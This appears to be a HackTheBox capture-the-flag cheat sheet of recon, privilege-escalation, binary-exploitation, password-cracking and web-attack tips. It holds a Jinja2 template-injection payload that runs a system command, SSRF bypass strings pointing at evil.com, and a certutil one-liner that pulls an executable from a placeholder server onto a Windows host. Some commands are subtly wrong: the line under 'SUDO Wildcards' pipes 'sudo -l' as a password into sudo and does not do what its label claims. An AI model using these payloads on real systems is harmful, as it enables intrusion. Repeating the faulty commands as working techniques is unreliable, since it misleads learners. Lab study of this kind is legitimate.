# HTB Machine Mastery: Pro CTF Strategies

_Collection of unique tips, methodologies, and pro insights for dominating HackTheBox machines_

## 🔍 Reconnaissance Pro Tips

```bash
# Ultra-fast port scanning combo
sudo nmap -sS --min-rate 10000 --open -Pn -n -vvv -oG allports <IP> && grep open allports | awk '{print $2}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//' | xargs sudo nmap -sCV -p
```

**Unique Approach**: 
- Always check for **alternate HTTP ports** (8080, 8443, 3000, etc.)
- For **UDP scans**, focus only on critical ports (DNS, SNMP, DHCP) to save time
- Use `curl -I http://<IP>` to check headers before full directory busting

## 🚪 Privilege Escalation Checklist

### Linux PrivEsc Shortcuts
1. **GTFOBins Quick Check**:
   ```bash
   find / -type f -perm -4000 -ls 2>/dev/null | awk '{print $11}' | xargs -I{} sh -c 'echo -n "{}: " && grep -m1 "{}" /usr/share/gtfobins/gtfobins.json 2>/dev/null || echo ""'
   ```
2. **Cron Job Hijacking**:
   ```bash
   cat /etc/crontab && ls -la /etc/cron* /var/spool/cron/crontabs
   ```
3. **SUDO Wildcards**:
   ```bash
   echo 'sudo -l' | sudo -S /bin/bash
   ```

### Windows PrivEsc Fast-Track
1. **AlwaysCheckThese**:
   ```powershell
   systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
   ```
2. **Quick Service Enum**:
   ```powershell
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   ```
3. **Unquoted Path Magic**:
   ```powershell
   gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -like "* *"}
   ```

## � Binary Exploitation Cheat Sheet

```python
# Template for buffer overflow
from pwn import *

context.update(arch='i386', os='linux')
pattern = cyclic(1000)
io = process('./vuln')

io.sendline(pattern)
io.wait()
core = io.corefile
eip = core.eip
offset = cyclic_find(eip)
log.info(f"EIP offset: {offset}")
```

**Pro Tip**: Always check for:
- `checksec` output
- Hidden functions in Ghidra (look beyond `main()`)
- Integer overflows when buffer overflows aren't present

## 🔑 Password Cracking Strategies

```bash
# Smart rule-based attack
hashcat -m 1800 -a 0 -r /usr/share/hashcat/rules/best64.rule hash.txt rockyou.txt
```

**Unique Approach**:
- First try: Common passwords with year append (`Password2023!`)
- Second try: Capitalize first letter + special char (`Summer!`)
- Third try: Leet speak transformations (`P@ssw0rd`)

## 🌐 Web App Secrets

**Hidden Attack Vectors**:
1. **SSRF Bypasses**:
   ```
   http://127.0.0.1@evil.com
   http://0177.0.0.1 (octal IP)
   ```
2. **SSTI Payloads**:
   ```python
   {{7*7}} # Basic test
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}} # Flask/Jinja2
   ```
3. **JWT Tricks**:
   ```bash
   jwt_tool <JWT> -T -v
   ```

## 📂 File Transfer Hacks

```bash
# Python3 HTTP server (works on most machines)
python3 -c "import http.server as s, socketserver as ss; ss.TCPServer(('', 8000), s.SimpleHTTPRequestHandler).serve_forever()"

# Windows one-liner download
certutil -urlcache -split -f http://yourserver.com/file.exe C:\Windows\Temp\file.exe
```

## 🎯 Pro Mindset Tips

1. **The 30-Minute Rule**: If stuck, document all findings and take a break
2. **Evidence Board Method**: Create a text file mapping all discovered info
3. **Vertical Enumeration**: When stuck, re-enumerate previous steps with new knowledge
4. **Machine Patterns**: HTB often reuses vulnerability patterns across machines

## 🛠️ Essential Tools Quick Reference

| Tool          | Pro Usage                                  |
|---------------|--------------------------------------------|
| `ffuf`        | `ffuf -u URL -w wordlist -H "Header: val"` |
| `linpeas`     | Always run with `-a` for full checks       |
| `pspy`        | Detect hidden cron jobs                    |
| `evil-winrm`  | `evil-winrm -i IP -u user -p pass`         |
| `chisel`      | Tunnel through firewalls                   |

## 📌 Final Advice
"Every machine teaches three lessons: 
1. What you know
2. What you thought you knew
3. What you need to learn next"
- _HTB Veteran_
